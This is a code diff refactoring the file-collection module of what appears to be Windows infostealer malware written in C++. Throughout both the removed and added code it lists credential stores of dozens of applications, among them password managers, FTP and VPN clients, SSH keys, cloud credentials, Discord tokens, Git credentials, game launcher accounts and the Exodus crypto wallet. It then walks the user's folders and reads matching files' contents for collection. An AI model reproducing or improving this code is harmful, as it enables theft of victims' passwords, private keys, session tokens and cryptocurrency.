@@ -1,501 +1,370 @@
 #include "important_files.h"
 #include <windows.h>
 #include <shlobj.h>
-#include <wincrypt.h>
 #include <filesystem>
+#include <iostream>
 #include <fstream>
-#include <string>
-#include <vector>
-#include <chrono>
 #include <sstream>
-#include <iomanip>
 #include <algorithm>
+#include <cctype>
+#include <map>
+#include <vector>
 
 namespace fs = std::filesystem;
 
-#pragma comment(lib, "crypt32.lib")
+// Maximum file size to read content (1MB)
+const long long MAX_FILE_SIZE_FOR_CONTENT = 1024 * 1024;
 
-// Structure to define extraction targets
-struct ExtractionTarget {
-    std::string appName;
-    std::vector<std::string> folders;
-    std::vector<std::string> filePatterns; // Use "*" for all files
-    bool recursive;
+// Application-specific file patterns
+const std::map<std::string, std::vector<std::string>> APP_SPECIFIC_FILES = {
+    {"FileZilla", {"sitemanager.xml", "recentservers.xml", "filezilla.xml"}},
+    {"Steam", {"*.vdf", "*.tmp", "config.vdf", "loginusers.vdf"}},
+    {"Outlook", {"*.ost", "*.pst"}},
+    {"Thunderbird", {"logins.json", "key4.db"}},
+    {"WinSCP", {"winscp.ini"}},
+    {"CiscoVPN", {"*.xml"}},
+    {"OpenVPN", {"*.ovpn", "config.json"}},
+    {"HeidiSQL", {"heidisql_settings.xml", "sessions.xml"}},
+    {"DBeaver", {"*.dbeaver-data-sources.xml"}},
+    {"VSCode", {"settings.json", "state.vscdb"}},
+    {"Git", {".git-credentials"}},
+    {"KeePass", {"*.kdbx", "*.kdb"}},
+    {"Discord", {"*.ldb", "*.log"}},
+    {"TeamViewer", {"connections.xml", "teamviewer.ini"}},
+    {"RemoteDesktop", {"*.rdp"}},
+    {"Cyberduck", {"bookmarks.plist"}},
+    {"7Zip", {"7zfm.ini"}},
+    {"Norton", {"*"}}, // All files
+    {"Origin", {"*"}}, // All files
+    {"PrismLauncher", {"accounts.json"}},
+    {"MultiMC", {"accounts.json"}},
+    {"LunarClient", {"accounts.json"}},
+    {"Feather", {"accounts.json"}},
+    {"TLauncher", {"tlauncherprofiles.json"}},
+    {"Essential", {"microsoft_accounts.json"}},
+    {"ATLauncher", {"accounts.json"}},
+    {"1Password", {"*.sqlite"}},
+    {"AnyDesk", {"*.conf"}},
+    {"AutoFTPManager", {"autoftpmanagersettings.db"}},
+    {"CloudCredentials", {"*", "msal.cache", "msalv2.cache", "*.db", "*.json"}},
+    {"Bitwarden", {"data.json"}},
+    {"FTPManagerLite", {"ftpmanagerlitesettings.db"}},
+    {"FTPRush", {"rushsite.xml"}},
+    {"GoogleCloud", {"*.db", "*.json"}},
+    {"NordPass", {"nordpass.json", "nordpass.sqlite"}},
+    {"NordVPN", {"user.config"}},
+    {"ProtonVPN", {"user.config"}},
+    {"RealVNC", {"*"}}, // All files
+    {"SmartFTP", {"*"}}, // All files
+    {"TightVNC", {"*"}}, // All files
+    {"TotalCommander", {"wcx_ftp.ini"}},
+    {"UltraVNC", {"*"}}, // All files
+    {"ExodusWallet", {"*.seco", "passphrase.json"}},
+    {"RiotGames", {"riotgamesprivatesettings.yaml"}},
+    {"SSH", {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "known_hosts", "authorized_keys"}},
+    {"AWS", {"credentials", "config"}}
 };
 
-// Helper to expand environment variables in paths
-static std::string expand_env_path(const std::string& path, const std::string& username) {
-    std::string result = path;
-    
-    size_t pos;
-    while ((pos = result.find("%USERNAME%")) != std::string::npos) {
-        result.replace(pos, 10, username);
+// Application-specific paths (additional search locations beyond the main config path)
+const std::map<std::string, std::vector<std::string>> APP_ADDITIONAL_PATHS = {
+    {"Git", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents", "%USERPROFILE%\\Downloads"}},
+    {"KeePass", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents", "%USERPROFILE%\\Dropbox", "%USERPROFILE%\\OneDrive"}},
+    {"RemoteDesktop", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Downloads"}},
+    {"Steam", {"C:\\Program Files (x86)\\Steam\\config"}},
+    {"Origin", {"C:\\ProgramData\\Origin", "%USERPROFILE%\\AppData\\Local\\Origin"}}
+};
+
+std::string expand_environment_variables(const std::string& path) {
+    char expandedPath[MAX_PATH];
+    DWORD result = ExpandEnvironmentStringsA(path.c_str(), expandedPath, MAX_PATH);
+
+    if (result == 0 || result > MAX_PATH) {
+        // Expansion failed or buffer too small, return original
+        return path;
     }
-    while ((pos = result.find("%USERPROFILE%")) != std::string::npos) {
-        result.replace(pos, 13, "C:\\Users\\" + username);
-    }
-    while ((pos = result.find("%APPDATA%")) != std::string::npos) {
-        result.replace(pos, 9, "C:\\Users\\" + username + "\\AppData\\Roaming");
-    }
-    while ((pos = result.find("%LOCALAPPDATA%")) != std::string::npos) {
-        result.replace(pos, 14, "C:\\Users\\" + username + "\\AppData\\Local");
-    }
-    
-    return result;
+
+    return std::string(expandedPath);
 }
 
-// Helper to check if filename matches any pattern
-static bool matches_pattern(const std::string& filename, const std::vector<std::string>& patterns) {
-    std::string upperFilename = filename;
-    std::transform(upperFilename.begin(), upperFilename.end(), upperFilename.begin(), ::toupper);
-    
-    for (const auto& pattern : patterns) {
-        if (pattern == "*") return true;
-        
-        std::string upperPattern = pattern;
-        std::transform(upperPattern.begin(), upperPattern.end(), upperPattern.begin(), ::toupper);
-        
-        // Check extension match (e.g., ".VDF")
-        if (upperPattern[0] == '.') {
-            if (upperFilename.length() >= upperPattern.length()) {
-                if (upperFilename.substr(upperFilename.length() - upperPattern.length()) == upperPattern) {
-                    return true;
-                }
-            }
+bool matches_file_pattern(const std::string& filename, const std::string& pattern) {
+    std::string lowerFilename = filename;
+    std::string lowerPattern = pattern;
+    std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
+    std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::tolower);
+
+    // Handle wildcards
+    if (pattern == "*") {
+        return true; // Match all files
+    }
+
+    if (pattern.find('*') != std::string::npos) {
+        // Simple wildcard matching for *.ext patterns
+        size_t starPos = pattern.find('*');
+        if (starPos == 0 && pattern.length() > 1 && pattern[1] == '.') {
+            // Pattern like *.ext
+            std::string ext = pattern.substr(1); // .ext
+            return lowerFilename.length() >= ext.length() &&
+                   lowerFilename.substr(lowerFilename.length() - ext.length()) == ext;
         }
-        // Check exact filename match or contains
-        else if (upperFilename.find(upperPattern) != std::string::npos) {
-            return true;
+    }
+
+    // Exact match (case-insensitive)
+    return lowerFilename == lowerPattern;
+}
+
+bool is_important_file_for_app(const std::string& filename, const std::string& appName) {
+    auto it = APP_SPECIFIC_FILES.find(appName);
+    if (it != APP_SPECIFIC_FILES.end()) {
+        for (const auto& pattern : it->second) {
+            if (matches_file_pattern(filename, pattern)) {
+                return true;
+            }
         }
     }
     return false;
 }
 
-// Helper to read and encode file content
-static std::optional<std::string> read_and_encode_file(const fs::path& filePath, uintmax_t fileSize) {
-    if (fileSize > 5 * 1024 * 1024) return std::nullopt; // Skip files > 5MB
-    
+std::optional<std::string> read_file_content(const std::string& filePath, long long maxSize) {
     try {
-        std::ifstream file(filePath, std::ios::binary);
-        if (!file) return std::nullopt;
-        
-        std::vector<char> buffer(fileSize);
-        file.read(buffer.data(), fileSize);
-        
-        DWORD encodedSize = 0;
-        CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
-                           CRYPT_STRING_BASE64, nullptr, &encodedSize);
-        
-        if (encodedSize > 0) {
-            std::string encoded(encodedSize, '\0');
-            CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
-                               CRYPT_STRING_BASE64, (char*)encoded.data(), &encodedSize);
-            encoded.resize(encodedSize - 1);
-            return encoded;
+        fs::path path(filePath);
+
+        // Check if file exists and get size
+        if (!fs::exists(path) || !fs::is_regular_file(path)) {
+            return std::nullopt;
         }
-    } catch (...) {}
-    
-    return std::nullopt;
+
+        auto fileSize = fs::file_size(path);
+        if (fileSize > maxSize || fileSize == 0) {
+            return std::nullopt; // File too large or empty
+        }
+
+        // Try to read as text file
+        std::ifstream file(path, std::ios::binary);
+        if (!file.is_open()) {
+            return std::nullopt;
+        }
+
+        std::stringstream buffer;
+        buffer << file.rdbuf();
+        file.close();
+
+        std::string content = buffer.str();
+
+        // Check if content is valid text (basic check)
+        bool isText = true;
+        for (char c : content) {
+            if (c < 32 && c != '\n' && c != '\r' && c != '\t') {
+                isText = false;
+                break;
+            }
+        }
+
+        return isText ? std::optional<std::string>(content) : std::nullopt;
+
+    } catch (const std::exception&) {
+        return std::nullopt;
+    }
 }
 
-// Helper to get file info and add to list
-static void extract_from_path(const std::string& folderPath, const std::vector<std::string>& patterns,
-                             const std::string& appName, bool recursive, std::vector<ImportantFile>& files) {
+std::optional<std::pair<long long, std::string>> get_file_info(const std::string& filePath) {
     try {
-        if (!fs::exists(folderPath)) return;
-        
-        auto process_entry = [&](const fs::directory_entry& entry) {
-            if (!entry.is_regular_file()) return;
-            
-            std::string filename = entry.path().filename().string();
-            if (!matches_pattern(filename, patterns)) return;
-            
-            try {
-                uintmax_t fileSize = entry.file_size();
-                if (fileSize > 50 * 1024 * 1024) return; // Skip files > 50MB
-                
-                auto lastWriteTime = entry.last_write_time();
-                auto time_t = std::chrono::system_clock::to_time_t(
-                    std::chrono::system_clock::time_point(lastWriteTime.time_since_epoch()));
-                std::stringstream ss;
-                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
-                
-                auto content = read_and_encode_file(entry.path(), fileSize);
-                
-                files.push_back({
-                    filename, appName, entry.path().string(),
-                    static_cast<long long>(fileSize), ss.str(), content
-                });
-            } catch (...) {}
-        };
-        
-        if (recursive) {
-            for (const auto& entry : fs::recursive_directory_iterator(folderPath, 
-                    fs::directory_options::skip_permission_denied)) {
-                process_entry(entry);
+        fs::path path(filePath);
+
+        if (!fs::exists(path) || !fs::is_regular_file(path)) {
+            return std::nullopt;
+        }
+
+        auto fileSize = fs::file_size(path);
+        // Get last modified time using Windows API
+        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
+                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        std::string lastModified = "Unknown";
+        if (hFile != INVALID_HANDLE_VALUE) {
+            FILETIME ftCreate, ftAccess, ftWrite;
+            if (GetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite)) {
+                SYSTEMTIME st;
+                if (FileTimeToSystemTime(&ftWrite, &st)) {
+                    std::stringstream ss;
+                    ss << st.wYear << "-" << std::setfill('0') << std::setw(2) << st.wMonth << "-"
+                       << std::setfill('0') << std::setw(2) << st.wDay << " "
+                       << std::setfill('0') << std::setw(2) << st.wHour << ":"
+                       << std::setfill('0') << std::setw(2) << st.wMinute << ":"
+                       << std::setfill('0') << std::setw(2) << st.wSecond;
+                    lastModified = ss.str();
+                }
             }
-        } else {
-            for (const auto& entry : fs::directory_iterator(folderPath, 
-                    fs::directory_options::skip_permission_denied)) {
-                process_entry(entry);
+            CloseHandle(hFile);
+        }
+
+        return std::make_pair(fileSize, lastModified);
+
+    } catch (const std::exception&) {
+        return std::nullopt;
+    }
+}
+
+void scan_directory_for_files(const std::string& directory, const std::string& appName,
+                            std::vector<ImportantFile>& files, int maxDepth) {
+    try {
+        fs::path dirPath(directory);
+
+        if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
+            return;
+        }
+
+        // Use recursive directory iterator with depth limit
+        auto iterator = fs::recursive_directory_iterator(
+            dirPath,
+            fs::directory_options::skip_permission_denied
+        );
+
+        for (const auto& entry : iterator) {
+            // Check depth limit
+            if (iterator.depth() > maxDepth) {
+                iterator.disable_recursion_pending();
+                continue;
+            }
+
+            if (!entry.is_regular_file()) {
+                continue;
+            }
+
+            std::string filePath = entry.path().string();
+            std::string fileName = entry.path().filename().string();
+
+            // Check if file is important for this application
+            if (!is_important_file_for_app(fileName, appName)) {
+                continue;
+            }
+
+            // Get file info
+            auto fileInfo = get_file_info(filePath);
+            if (!fileInfo) {
+                continue;
+            }
+
+            long long fileSize = fileInfo->first;
+            std::string lastModified = fileInfo->second;
+
+            // Determine file type based on extension
+            std::string fileType = "Other";
+            std::string lowerFileName = fileName;
+            std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);
+
+            if (lowerFileName.find(".key") != std::string::npos ||
+                lowerFileName.find(".pem") != std::string::npos ||
+                lowerFileName.find(".crt") != std::string::npos ||
+                lowerFileName.find(".cer") != std::string::npos ||
+                lowerFileName.find(".p12") != std::string::npos ||
+                lowerFileName.find(".pfx") != std::string::npos) {
+                fileType = "Certificate/Key";
+            } else if (lowerFileName.find(".db") != std::string::npos ||
+                       lowerFileName.find(".sqlite") != std::string::npos) {
+                fileType = "Database";
+            } else if (lowerFileName.find(".wallet") != std::string::npos ||
+                       lowerFileName.find(".dat") != std::string::npos) {
+                fileType = "Wallet";
+            } else if (lowerFileName.find(".config") != std::string::npos ||
+                       lowerFileName.find(".ini") != std::string::npos ||
+                       lowerFileName.find(".cfg") != std::string::npos ||
+                       lowerFileName.find(".conf") != std::string::npos) {
+                fileType = "Configuration";
+            } else if (lowerFileName.find(".log") != std::string::npos) {
+                fileType = "Log";
+            } else if (lowerFileName.find(".txt") != std::string::npos) {
+                fileType = "Text";
+            } else if (lowerFileName.find(".json") != std::string::npos ||
+                       lowerFileName.find(".xml") != std::string::npos) {
+                fileType = "Data";
+            } else if (lowerFileName.find(".rdp") != std::string::npos ||
+                       lowerFileName.find(".vpn") != std::string::npos ||
+                       lowerFileName.find(".ovpn") != std::string::npos) {
+                fileType = "Connection";
+            } else if (lowerFileName.find(".ppk") != std::string::npos ||
+                       lowerFileName.find(".pub") != std::string::npos ||
+                       lowerFileName.find(".priv") != std::string::npos) {
+                fileType = "SSH Key";
+            }
+
+            // Try to read file content for smaller files
+            std::optional<std::string> fileContent;
+            if (fileSize <= MAX_FILE_SIZE_FOR_CONTENT) {
+                fileContent = read_file_content(filePath, MAX_FILE_SIZE_FOR_CONTENT);
+            }
+
+            // Create ImportantFile object
+            ImportantFile importantFile;
+            importantFile.fileName = fileName;
+            importantFile.fileType = fileType;
+            importantFile.filePath = filePath;
+            importantFile.fileSize = fileSize;
+            importantFile.lastModified = lastModified;
+            importantFile.fileContent = fileContent;
+
+            files.push_back(importantFile);
+
+            // Limit total files per app to prevent excessive collection
+            if (files.size() >= 50) {
+                break;
             }
         }
-    } catch (...) {}
+
+    } catch (const std::exception&) {
+        // Silently ignore directory scanning errors
+    }
 }
 
 std::vector<ImportantFile> extract_important_files(const std::vector<ImportantFileConfig>& config) {
-    std::vector<ImportantFile> files;
-    
-    // Get username
-    char username[256];
-    DWORD usernameLen = sizeof(username);
-    GetUserNameA(username, &usernameLen);
-    std::string user(username);
-    
-    char userProfile[MAX_PATH];
-    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
-        return files;
-    }
-    std::string userHome = userProfile;
-    
-    std::vector<ExtractionTarget> targets;
-    
-    // If config is provided, use it; otherwise use defaults
-    if (!config.empty()) {
-        // Use provided configuration - only process enabled items
-        for (const auto& fileConfig : config) {
-            if (fileConfig.enabled && !fileConfig.path.empty()) {
-                // Determine file patterns and recursive based on app name
-                std::vector<std::string> patterns = {"*"}; // Default to all files
-                bool recursive = true; // Default to recursive
-                
-                // Map app names to their typical file patterns (simplified - can be enhanced)
-                if (fileConfig.appName == "FileZilla") {
-                    patterns = {"SITEMANAGER.XML", "RECENTSERVERS.XML", "FILEZILLA.XML"};
-                    recursive = false;
-                } else if (fileConfig.appName == "Steam") {
-                    patterns = {".VDF", ".TMP"};
-                    recursive = true;
-                } else if (fileConfig.appName == "Outlook") {
-                    patterns = {".OST", ".PST"};
-                    recursive = true;
-                } else if (fileConfig.appName == "Thunderbird") {
-                    patterns = {"LOGINS.JSON", "KEY4.DB"};
-                    recursive = true;
-                } else if (fileConfig.appName == "WinSCP") {
-                    patterns = {"WINSCP.INI", "STORED SESSIONS"};
-                    recursive = true;
-                } else if (fileConfig.appName == "CiscoVPN") {
-                    patterns = {".XML"};
-                    recursive = true;
-                } else if (fileConfig.appName == "OpenVPN") {
-                    patterns = {".OVPN", "CONFIG.JSON"};
-                    recursive = true;
-                } else if (fileConfig.appName == "HeidiSQL") {
-                    patterns = {"HEIDISQL_SETTINGS.XML", "SESSIONS.XML", ".XML"};
-                    recursive = false;
-                } else if (fileConfig.appName == "DBeaver") {
-                    patterns = {".DBEAVER-DATA-SOURCES.XML", "DATA-SOURCES.XML"};
-                    recursive = true;
-                } else if (fileConfig.appName == "VSCode") {
-                    patterns = {"SETTINGS.JSON", "STATE.VSCDB", ".VSCDB"};
-                    recursive = true;
-                } else if (fileConfig.appName == "Git") {
-                    patterns = {".GIT-CREDENTIALS"};
-                    recursive = false;
-                } else if (fileConfig.appName == "KeePass") {
-                    patterns = {".KDBX", ".KDB"};
-                    recursive = true;
-                } else if (fileConfig.appName == "Discord") {
-                    patterns = {".LDB", ".LOG"};
-                    recursive = false;
-                } else if (fileConfig.appName == "TeamViewer") {
-                    patterns = {"CONNECTIONS.XML", "TEAMVIEWER.INI", ".XML", ".INI"};
-                    recursive = false;
-                } else if (fileConfig.appName == "RemoteDesktop") {
-                    patterns = {".RDP"};
-                    recursive = true;
-                } else if (fileConfig.appName == "Cyberduck") {
-                    patterns = {"BOOKMARKS.PLIST", ".PLIST"};
-                    recursive = true;
-                } else if (fileConfig.appName == "7Zip") {
-                    patterns = {"7ZFM.INI"};
-                    recursive = false;
-                } else if (fileConfig.appName == "SSH") {
-                    patterns = {"*"};
-                    recursive = false;
-                } else if (fileConfig.appName == "AWS") {
-                    patterns = {"CREDENTIALS", "CONFIG", "*"};
-                    recursive = false;
+    std::vector<ImportantFile> allFiles;
+
+    for (const auto& fileConfig : config) {
+        if (!fileConfig.enabled) {
+            continue;
+        }
+
+        // Expand environment variables in path
+        std::string expandedPath = expand_environment_variables(fileConfig.path);
+
+        // Scan the main configured directory
+        scan_directory_for_files(expandedPath, fileConfig.appName, allFiles);
+
+        // Special handling for Git - look for .git directories
+        if (fileConfig.appName == "Git") {
+            try {
+                std::vector<std::string> gitSearchPaths = {expandedPath};
+                auto additionalPathsIt = APP_ADDITIONAL_PATHS.find(fileConfig.appName);
+                if (additionalPathsIt != APP_ADDITIONAL_PATHS.end()) {
+                    for (const auto& additionalPath : additionalPathsIt->second) {
+                        gitSearchPaths.push_back(expand_environment_variables(additionalPath));
+                    }
                 }
-                // For all other apps, use default patterns and recursive
-                
-                targets.push_back({
-                    fileConfig.appName,
-                    {fileConfig.path},
-                    patterns,
-                    recursive
-                });
+
+                for (const auto& searchPath : gitSearchPaths) {
+                    fs::path searchDir(searchPath);
+                    if (fs::exists(searchDir) && fs::is_directory(searchDir)) {
+                        // Look for .git directories and scan them
+                        for (const auto& entry : fs::directory_iterator(searchDir)) {
+                            if (entry.is_directory() && entry.path().filename() == ".git") {
+                                scan_directory_for_files(entry.path().string(), fileConfig.appName, allFiles, 1);
+                            }
+                        }
+                    }
+                }
+            } catch (const std::exception&) {
+                // Fall back to normal scanning if special handling fails
+                scan_directory_for_files(expandedPath, fileConfig.appName, allFiles);
+            }
+        } else {
+            // Check for additional search paths for other specific applications
+            auto additionalPathsIt = APP_ADDITIONAL_PATHS.find(fileConfig.appName);
+            if (additionalPathsIt != APP_ADDITIONAL_PATHS.end()) {
+                for (const auto& additionalPath : additionalPathsIt->second) {
+                    std::string expandedAdditionalPath = expand_environment_variables(additionalPath);
+                    scan_directory_for_files(expandedAdditionalPath, fileConfig.appName + "_Extra", allFiles);
+                }
             }
         }
-    } else {
-        // Fall back to default hardcoded targets if no config provided
-        targets = {
-        // FileZilla
-        {"FileZilla", 
-         {"%APPDATA%\\FileZilla"}, 
-         {"SITEMANAGER.XML", "RECENTSERVERS.XML", "FILEZILLA.XML"}, false},
-        
-        // Steam
-        {"Steam",
-         {"%LOCALAPPDATA%\\Steam", "C:\\Program Files (x86)\\Steam\\config"},
-         {".VDF", ".TMP"}, true},
-        
-        // Microsoft Outlook
-        {"Outlook",
-         {"%LOCALAPPDATA%\\Microsoft\\Outlook"},
-         {".OST", ".PST"}, true},
-        
-        // Thunderbird
-        {"Thunderbird",
-         {"%APPDATA%\\Thunderbird\\Profiles"},
-         {"LOGINS.JSON", "KEY4.DB"}, true},
-        
-        // WinSCP
-        {"WinSCP",
-         {"%APPDATA%\\WinSCP"},
-         {"WINSCP.INI", "STORED SESSIONS"}, true},
-        
-        // Cisco AnyConnect VPN
-        {"CiscoVPN",
-         {"C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Profile"},
-         {".XML"}, true},
-        
-        // OpenVPN
-        {"OpenVPN",
-         {"%USERPROFILE%\\OpenVPN\\config", "%APPDATA%\\OpenVPNConnect"},
-         {".OVPN", "CONFIG.JSON"}, true},
-        
-        // HeidiSQL
-        {"HeidiSQL",
-         {"%APPDATA%\\HeidiSQL"},
-         {"HEIDISQL_SETTINGS.XML", "SESSIONS.XML", ".XML"}, false},
-        
-        // DBeaver
-        {"DBeaver",
-         {"%APPDATA%\\DBeaverData\\General"},
-         {".DBEAVER-DATA-SOURCES.XML", "DATA-SOURCES.XML"}, true},
-        
-        // Visual Studio Code
-        {"VSCode",
-         {"%APPDATA%\\Code\\User", "%APPDATA%\\Code\\User\\globalStorage"},
-         {"SETTINGS.JSON", "STATE.VSCDB", ".VSCDB"}, true},
-        
-        // Git Credentials
-        {"Git",
-         {"%USERPROFILE%"},
-         {".GIT-CREDENTIALS"}, false},
-        
-        // KeePass
-        {"KeePass",
-         {"%USERPROFILE%\\Documents", "%APPDATA%\\KeePass"},
-         {".KDBX", ".KDB"}, true},
-        
-        // Discord
-        {"Discord",
-         {"%APPDATA%\\Discord\\Local Storage\\leveldb"},
-         {".LDB", ".LOG"}, false},
-        
-        // TeamViewer
-        {"TeamViewer",
-         {"%APPDATA%\\TeamViewer"},
-         {"CONNECTIONS.XML", "TEAMVIEWER.INI", ".XML", ".INI"}, false},
-        
-        // Remote Desktop
-        {"RemoteDesktop",
-         {"%USERPROFILE%\\Documents"},
-         {".RDP"}, true},
-        
-        // Cyberduck
-        {"Cyberduck",
-         {"%APPDATA%\\Cyberduck"},
-         {"BOOKMARKS.PLIST", ".PLIST"}, true},
-        
-        // 7-Zip
-        {"7Zip",
-         {"%APPDATA%\\7-Zip"},
-         {"7ZFM.INI"}, false},
-        
-        // Norton Password Manager
-        {"Norton",
-         {"%LOCALAPPDATA%\\Norton"},
-         {"*"}, true},
-        
-        // Origin
-        {"Origin",
-         {"C:\\ProgramData\\Origin", "%LOCALAPPDATA%\\Origin"},
-         {"*"}, true},
-        
-        // PrismLauncher (Minecraft)
-        {"PrismLauncher",
-         {"%APPDATA%\\PrismLauncher"},
-         {"ACCOUNTS.JSON"}, true},
-        
-        // MultiMC (Minecraft)
-        {"MultiMC",
-         {"%USERPROFILE%\\Desktop\\MultiMC", "%USERPROFILE%\\Downloads\\MultiMC"},
-         {"ACCOUNTS.JSON"}, true},
-        
-        // LunarClient (Minecraft)
-        {"LunarClient",
-         {"%USERPROFILE%\\.lunarclient\\settings\\game"},
-         {"ACCOUNTS.JSON"}, true},
-        
-        // Feather (Minecraft)
-        {"Feather",
-         {"%APPDATA%\\.feather"},
-         {"ACCOUNTS.JSON"}, true},
-        
-        // TLauncher (Minecraft)
-        {"TLauncher",
-         {"%APPDATA%\\.minecraft"},
-         {"TLAUNCHERPROFILES.JSON"}, false},
-        
-        // Essential (Minecraft)
-        {"Essential",
-         {"%APPDATA%\\.minecraft\\essential"},
-         {"MICROSOFT_ACCOUNTS.JSON"}, true},
-        
-        // ATLauncher (Minecraft)
-        {"ATLauncher",
-         {"%APPDATA%\\ATLauncher\\configs"},
-         {"ACCOUNTS.JSON"}, true},
-        
-        // 1Password
-        {"1Password",
-         {"%LOCALAPPDATA%\\1Password"},
-         {".SQLITE", ".DB"}, true},
-        
-        // AnyDesk
-        {"AnyDesk",
-         {"%APPDATA%\\AnyDesk"},
-         {".CONF"}, true},
-        
-        // Auto FTP Manager
-        {"AutoFTPManager",
-         {"%LOCALAPPDATA%\\DeskShareData\\AutoFTPManager"},
-         {"AUTOFTPMANAGERSETTINGS.DB", ".DB"}, true},
-        
-        // Azure/AWS/GCloud
-        {"CloudCredentials",
-         {"%USERPROFILE%\\.azure", "%USERPROFILE%\\.aws", "%APPDATA%\\gcloud", "%LOCALAPPDATA%\\.IdentityService"},
-         {"*"}, true},
-        
-        // Bitwarden
-        {"Bitwarden",
-         {"%APPDATA%\\Bitwarden"},
-         {"DATA.JSON", ".JSON"}, true},
-        
-        // FTP Manager Lite
-        {"FTPManagerLite",
-         {"%LOCALAPPDATA%\\DeskShareData\\FTPManagerLite"},
-         {"FTPMANAGERLITESETTINGS.DB", ".DB"}, true},
-        
-        // FTPRush
-        {"FTPRush",
-         {"%APPDATA%\\FTPRush"},
-         {"RUSHSITE.XML", ".XML"}, true},
-        
-        // Google Cloud
-        {"GoogleCloud",
-         {"%APPDATA%\\gcloud"},
-         {".DB", ".JSON"}, true},
-        
-        // NordPass
-        {"NordPass",
-         {"%APPDATA%\\NordPass"},
-         {"NORDPASS.JSON", "NORDPASS.SQLITE", ".JSON", ".SQLITE"}, true},
-        
-        // NordVPN
-        {"NordVPN",
-         {"%LOCALAPPDATA%\\NordVPN"},
-         {"USER.CONFIG", ".CONFIG"}, true},
-        
-        // ProtonVPN
-        {"ProtonVPN",
-         {"%LOCALAPPDATA%\\ProtonVPN"},
-         {"USER.CONFIG", ".CONFIG"}, true},
-        
-        // RealVNC
-        {"RealVNC",
-         {"%APPDATA%\\RealVNC"},
-         {"*"}, true},
-        
-        // SmartFTP
-        {"SmartFTP",
-         {"%APPDATA%\\SmartFTP\\Client2.0\\Favorites"},
-         {"*"}, true},
-        
-        // TightVNC
-        {"TightVNC",
-         {"%APPDATA%\\TightVNC"},
-         {"*"}, true},
-        
-        // TotalCommander
-        {"TotalCommander",
-         {"%APPDATA%\\GHISLER"},
-         {"WCX_FTP.INI", ".INI"}, true},
-        
-        // UltraVNC
-        {"UltraVNC",
-         {"%APPDATA%\\UltraVNC"},
-         {"*"}, true},
-        
-        // Exodus Wallet
-        {"ExodusWallet",
-         {"%APPDATA%\\Exodus\\exodus.wallet"},
-         {".SECO", "PASSPHRASE.JSON"}, true},
-        
-        // Riot Games
-        {"RiotGames",
-         {"%LOCALAPPDATA%\\Riot Games\\Riot Client\\Data"},
-         {"RIOTGAMESPRIVATESETTINGS.YAML", ".YAML"}, true},
-        
-        // SSH Keys
-        {"SSH",
-         {"%USERPROFILE%\\.ssh"},
-         {"*"}, false},
-        
-        // AWS Credentials
-        {"AWS",
-         {"%USERPROFILE%\\.aws"},
-         {"CREDENTIALS", "CONFIG", "*"}, false}
-        };
     }
-    
-    // Process each target
-    for (const auto& target : targets) {
-        for (const auto& folder : target.folders) {
-            std::string expandedPath = expand_env_path(folder, user);
-            extract_from_path(expandedPath, target.filePatterns, target.appName, target.recursive, files);
-        }
-    }
-    
-    // Also scan for common sensitive file patterns
-    std::vector<std::string> sensitivePatterns = {
-        ".ENV", ".PEM", ".KEY", ".P12", ".PFX", ".CRT", ".CER",
-        "CREDENTIALS", "SECRET", "TOKEN", "API_KEY", "APIKEY"
-    };
-    
-    std::vector<std::string> commonPaths = {
-        userHome + "\\Documents",
-        userHome + "\\Desktop",
-        userHome + "\\.config"
-    };
-    
-    for (const auto& path : commonPaths) {
-        extract_from_path(path, sensitivePatterns, "SensitiveFile", true, files);
-    }
-    
-    return files;
+
+    return allFiles;
 }
